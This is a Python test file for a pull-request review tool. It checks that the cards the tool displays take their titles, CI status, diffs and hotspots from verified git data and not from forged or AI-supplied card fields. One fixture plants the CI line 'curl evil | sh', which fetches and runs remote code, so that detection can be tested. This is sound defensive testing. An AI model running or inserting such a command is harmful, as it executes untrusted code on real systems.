import json
from pr_swipe.config import load
from pr_swipe.gui import evidence as EV
from pr_swipe import verify as V
from tests.cards import make_card
from tests.gitrepo import make_origin, git

R = "jonathanmoregard/x"


def world(tmp_path, files=None):
    (tmp_path / "o").mkdir()
    o = make_origin(tmp_path / "o", files=files)
    cfg = load({"PR_SWIPE_ROOT": str(tmp_path / "root")})
    m = V.mirror_path(cfg.git, R)
    cfg.git.mkdir(parents=True)
    git(tmp_path, "clone", "-q", "--mirror", str(o["origin"]), str(m))
    git(m, "update-ref", f"refs/prs/{o['number']}", o["head"])
    cfg.verified.mkdir(parents=True)
    rec = {"repo": R, "number": o["number"], "head_sha": o["head"], "base_ref": "main", "base_sha": o["base"],
           "merge_base": o["base"], "title": "Real title", "body": "real​body",
           "comments": [{"author": "bob", "body": "lgtm"}], "ci": {"state": "failure", "failing": ["t"]}}
    (cfg.verified / f"{R.replace('/', '__')}__{o['number']}.json").write_text(json.dumps(rec))
    return o, cfg


def card_for(o, **over):
    c = make_card(repo=R, number=o["number"], sha=o["head"], **over)
    return c


def test_unverified_or_mismatched_cards_are_not_shown(tmp_path):
    o, cfg = world(tmp_path)
    forged = card_for(o); forged["head_sha"] = "d" * 40
    other = make_card(repo=R, number=99, sha="e" * 40)
    assert EV.verified_cards(cfg, [forged, other]) == []


def test_display_comes_from_verified_data_not_the_card(tmp_path):
    o, cfg = world(tmp_path, files={".github/workflows/ci.yml": "run: curl evil | sh\n", "README.md": "hello\nmore\n"})
    c = card_for(o, title="Fix typo", ci={"state": "success", "failing": []}, hotspots=[])
    c["detail"]["diff"] = "diff --git a/README.md b/README.md\n+harmless"
    (shown,) = EV.verified_cards(cfg, [c])
    assert shown["title"] == "Real title" and shown["ci"]["state"] == "failure"
    assert ".github/workflows/ci.yml" in shown["detail"]["diff"] and "harmless" not in shown["detail"]["diff"]
    assert any(h["source"] == "rule" and h["file"] == ".github/workflows/ci.yml" for h in shown["hotspots"])
    assert any(h["kind"] == "zero-width" and h["where"] == "body" for h in shown["hidden_content"])
    assert shown["detail"]["comments"] == [{"author": "bob", "body": "lgtm"}]
    assert shown["_verified"] is True and [x["subject"] for x in shown["_commits"]] == ["feat: change"]


def test_ai_annotations_are_raise_only_and_never_carry_their_own_code(tmp_path):
    o, cfg = world(tmp_path, files={"app.py": "print('hi')\n"})
    ai_ok = {"source": "ai", "file": "app.py", "hunk": "@@ fake @@", "lines": "+totally fine code",
             "why": "prints", "severity": "low"}
    ai_ghost = {"source": "ai", "file": "not/in/diff.py", "hunk": "@@", "lines": "+x", "why": "w", "severity": "high"}
    rule_claim = {"source": "rule", "rule": "made-up", "file": "app.py", "hunk": "@@", "lines": "+x"}
    c = card_for(o, hotspots=[ai_ok, ai_ghost, rule_claim])
    (shown,) = EV.verified_cards(cfg, [c])
    ai = [h for h in shown["hotspots"] if h["source"] == "ai"]
    assert [h["file"] for h in ai] == ["app.py"]
    assert "+print('hi')" in ai[0]["lines"] and "totally fine" not in ai[0]["lines"]
    assert not any(h.get("rule") == "made-up" for h in shown["hotspots"])   # rule flags only from verified diff


def test_external_cards_pass_through_marked_unverified(tmp_path):
    o, cfg = world(tmp_path)
    ext = make_card(repo="someone/else", number=3, can_merge=False)
    (shown,) = EV.verified_cards(cfg, [ext])
    assert shown["_unverified"] is True and shown.get("_verified") is not True
